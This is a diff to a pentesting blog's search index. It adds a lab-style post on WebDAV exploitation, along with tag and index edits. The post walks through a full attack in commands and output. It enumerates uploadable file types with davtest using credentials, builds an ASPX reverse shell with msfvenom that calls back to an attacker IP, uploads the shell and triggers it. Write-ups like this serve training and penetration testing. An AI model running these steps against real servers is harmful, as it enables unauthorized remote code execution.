@@ -4,6 +4,49 @@ var relearn_searchindex = [
     "content": "",
     "description": "",
     "tags": [],
+    "title": "Tag :: Davtest",
+    "uri": "/tags/davtest/index.html"
+  },
+  {
+    "breadcrumb": "Zenu",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Tags",
+    "uri": "/tags/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Tags",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Tag :: Webdav",
+    "uri": "/tags/webdav/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Posts",
+    "content": "WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.\nWebDAV typically requires credentials to interact with.\nStep 1 — Enumerate Allowed File Types with davtest davtest tests which file types can be uploaded and executed on the target WebDAV server.\ndavtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122 Created: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.shtml PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jsp PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jhtml PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cgi PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cfm PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.pl PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.php Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html The output shows both .aspx and .asp are executable — meaning we can upload a web shell or reverse shell payload in either format.\nStep 2 — Generate a Reverse Shell Payload Using msfvenom, generate an ASPX reverse shell:\nmsfvenom -p windows/x64/shell_reverse_tcp -f aspx -o rev.aspx LHOST=192.168.45.212 LPORT=443 Step 3 — Upload the Payload Upload the payload using the directory that davtest created in step 1:\ndavtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122 Step 4 — Trigger the Shell With a listener ready, browse to the uploaded file to execute it:\nhttp://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/rev.aspx The reverse shell connects back to the attacker machine.",
+    "description": "WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.\nWebDAV typically requires credentials to interact with.\nStep 1 — Enumerate Allowed File Types with davtest davtest tests which file types can be uploaded and executed on the target WebDAV server.",
+    "tags": [
+      "Webdav",
+      "Davtest"
+    ],
+    "title": "WebDAV Exploitation with davtest",
+    "uri": "/posts/webdav/index.html"
+  },
+  {
+    "breadcrumb": "",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Zenu",
+    "uri": "/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Tags",
+    "content": "",
+    "description": "",
+    "tags": [],
     "title": "Tag :: /Etc/Passwd",
     "uri": "/tags//etc/passwd/index.html"
   },
@@ -28,28 +71,12 @@ var relearn_searchindex = [
     "uri": "/writeup/proving-grounds/snookums/index.html"
   },
   {
-    "breadcrumb": "Zenu",
-    "content": "",
-    "description": "",
-    "tags": [],
-    "title": "Tags",
-    "uri": "/tags/index.html"
-  },
-  {
     "breadcrumb": "Zenu \u003e Tags",
     "content": "",
     "description": "",
     "tags": [],
     "title": "Tag :: Writable",
     "uri": "/tags/writable/index.html"
-  },
-  {
-    "breadcrumb": "",
-    "content": "",
-    "description": "",
-    "tags": [],
-    "title": "Zenu",
-    "uri": "/index.html"
   },
   {
     "breadcrumb": "Zenu \u003e Tags",
@@ -101,7 +128,7 @@ var relearn_searchindex = [
     "content": "",
     "description": "",
     "tags": [],
-    "title": "Tag :: Bloodhound",
+    "title": "Tag :: BloodHound",
     "uri": "/tags/bloodhound/index.html"
   },
   {
@@ -118,7 +145,7 @@ var relearn_searchindex = [
     "description": "Heist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.",
     "tags": [
       "SeRestorePrivilege",
-      "Bloodhound",
+      "BloodHound",
       "ReadGMSAPassword",
       "Responder",
       "GMSApassword",
@@ -206,7 +233,7 @@ var relearn_searchindex = [
     "tags": [
       "Responder",
       "DACL",
-      "Bloodhound",
+      "BloodHound",
       "Ntlm_theft",
       "SharpGPOAbuse",
       "Impacket-Owneredit",
@@ -253,8 +280,8 @@ var relearn_searchindex = [
   },
   {
     "breadcrumb": "Zenu",
-    "content": "Cheat Sheets \u0026 Tips\nFile Transfer Pivoting Stabilize a reverse shell",
-    "description": "Cheat Sheets \u0026 Tips\nFile Transfer Pivoting Stabilize a reverse shell",
+    "content": "Cheat Sheets \u0026 Tips\nFile Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
+    "description": "Cheat Sheets \u0026 Tips\nFile Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
     "tags": [],
     "title": "Posts",
     "uri": "/posts/index.html"
